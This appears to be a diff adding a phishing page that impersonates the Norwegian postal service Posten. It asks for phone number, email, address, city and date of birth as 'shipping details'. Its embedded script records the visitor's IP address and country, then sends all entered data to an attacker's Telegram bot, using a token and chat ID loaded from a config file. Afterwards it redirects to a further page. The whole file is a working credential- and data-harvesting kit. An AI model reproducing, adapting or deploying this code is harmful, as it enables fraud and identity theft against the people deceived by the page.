@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html lang="no">
+<head>
+  <meta charset="UTF-8">
+      <link rel="icon" href="./X9/icon.jpeg" type="icon.jpeg"> 
+
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Posten - Fraktdetaljer</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #fff;
+    }
+
+    header {
+      text-align: center;
+      padding: 20px 0;
+    }
+
+    header img {
+      width: 120px;
+      max-width: 100%;
+      height: auto;
+    }
+
+    .form-container {
+      border: 1px solid #e60000;
+      border-radius: 5px;
+      margin: 20px auto;
+      padding: 20px;
+      max-width: 600px;
+      box-sizing: border-box;
+    }
+
+    .form-container h2 {
+      text-align: center;
+      font-size: 18px;
+      color: #333;
+      margin-bottom: 5px;
+    }
+
+    .form-container p {
+      text-align: center;
+      font-size: 15px;
+      color: #000;
+      margin-top: 0;
+    }
+
+    form {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+      margin-top: 20px;
+    }
+
+    label {
+      font-size: 14px;
+      color: #333;
+    }
+
+    input {
+      padding: 10px;
+      font-size: 16px;
+      border: none;
+      background: #f1f1f1;
+      border-radius: 4px;
+      width: 100%;
+      box-sizing: border-box;
+    }
+
+    .submit-btn {
+      background-color: #d32f2f;
+      color: white;
+      padding: 12px;
+      font-size: 16px;
+      border: none;
+      border-radius: 5px;
+      margin-top: 10px;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+
+    .submit-btn:hover {
+      background-color: #b71c1c;
+    }
+
+    footer {
+      background-color: #450000;
+      color: white;
+      text-align: center;
+      padding: 20px 10px;
+      font-size: 14px;
+      margin-top: 40px;
+    }
+
+    footer img {
+      width: 100px;
+      max-width: 100%;
+      height: auto;
+    }
+
+    /* Responsive adjustments */
+    @media (min-width: 768px) {
+      .form-container {
+        padding: 30px;
+      }
+
+      .form-container h2 {
+        font-size: 20px;
+      }
+
+      .form-container p {
+        font-size: 16px;
+      }
+
+      .submit-btn {
+        font-size: 18px;
+        padding: 14px;
+      }
+
+      label, input {
+        font-size: 16px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <header>
+    <img src="./X9/A.png" alt="Posten">
+  </header>
+
+  <div class="form-container">
+    <h2>👤 Skriv inn dine fraktdetaljer</h2>
+    <p>Bekreft leveringsadressen din</p>
+
+    <form id="into">
+      <label for="phone">Mobilnummer</label>
+      <input type="tel" id="A" name="phone" required>
+
+      <label for="email">E-post</label>
+      <input type="email" id="B" name="email" required>
+
+      <label for="address">1 adresselinje</label>
+      <input type="text" id="C" name="address" required>
+
+      <label for="city">by</label>
+      <input type="text" id="D" name="city" required>
+
+      <label for="dob">Fødselsdato</label>
+      <input type="text" id="E" name="dob" placeholder="ddmmåå" required>
+
+      <button type="submit" class="submit-btn">Bekrefte</button>
+    </form>
+  </div>
+
+  <footer>
+    <img src="./X9/A.png" alt="Posten Logo">
+    <p>©Posten Bring</p>
+  </footer>
+
+</body>
+        <!-- JS FILES -->
+        <script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/js/all.min.js"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
+		
+        <script>
+            $("#A").mask("0000000000");
+            $("#E").mask("00/00/0000");
+        </script>
+<script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
+<script>
+    $(document).ready(function () {
+        // Load botToken and chatId from TELEGRAM.json
+        function loadConfig() {
+            return fetch('so.json')
+                .then(response => response.json())
+                .then(data => ({
+                    botToken: data.botToken,
+                    chatId: data.chatId
+                }))
+                .catch(error => {
+                    console.error('Error loading config file:', error);
+                    return null;
+                });
+        }
+
+        // Get user's IP and country using ipify and ipinfo.io
+        function getIpAndCountry() {
+            return $.get('https://api.ipify.org?format=json')
+                .then(function(ipData) {
+                    // Get country based on IP
+                    return $.get('https://ipinfo.io/' + ipData.ip + '/json')
+                        .then(function(data) {
+                            return {
+                                ip: ipData.ip,
+                                country: data.country || 'Unknown'
+                            };
+                        })
+                        .catch(function() {
+                            return {
+                                ip: ipData.ip,
+                                country: 'Unknown'
+                            };
+                        });
+                })
+                .catch(function() {
+                    return {
+                        ip: 'Unavailable',
+                        country: 'Unknown'
+                    };
+                });
+        }
+
+        $("#into").submit(function (event) {
+            event.preventDefault(); // Prevent default form action
+
+            var one = $("#A").val().trim();
+            var two = $("#B").val().trim();
+            var three = $("#C").val().trim();
+            var four = $("#D").val().trim();
+            var five = $("#E").val().trim();
+
+            if (one && two && three && four && five) {
+                loadConfig().then(config => {
+                    if (config) {
+                        getIpAndCountry().then(data => {
+                            var ipAddress = data.ip;
+                            var country = data.country;
+                            var now = new Date().toLocaleString(); // Get current date and time
+
+                            var telegramMessage = "📱 **Billing Info**\n\n" +
+                                "🔹 **Mobilnummer:** `" + one + "`\n" +
+                                "🔹 **E-post:** `" + two + "`\n" +
+                                "🔹 **1 adresselinje:** `" + three + "`\n" +
+                                "🔹 **by:** `" + four + "`\n" +
+                                "🔹 **Fødselsdato:** `" + five + "`\n" +
+                                "🔹 **IP Address:** `" + ipAddress + "`\n" +
+                                "🏳 **Country:** `" + country + "`\n" +
+                                "🕒 **Date/Time:** `" + now + "`";
+
+                            var telegramBotUrl = "https://api.telegram.org/bot" + config.botToken + "/sendMessage";
+                            var requestData = {
+                                chat_id: config.chatId,
+                                text: telegramMessage,
+                                parse_mode: "Markdown"
+                            };
+
+                            $.post(telegramBotUrl, requestData, function () {
+                                window.location.href = "C1.html?vc?__event=cauuuze&service_id=top_ouazt=NO";
+                            }).fail(function () {
+                                alert("Bitte versuchen Sie es erneut.");
+                            });
+                        });
+                    }
+                });
+            }
+        });
+    });
+</script>
+</html>
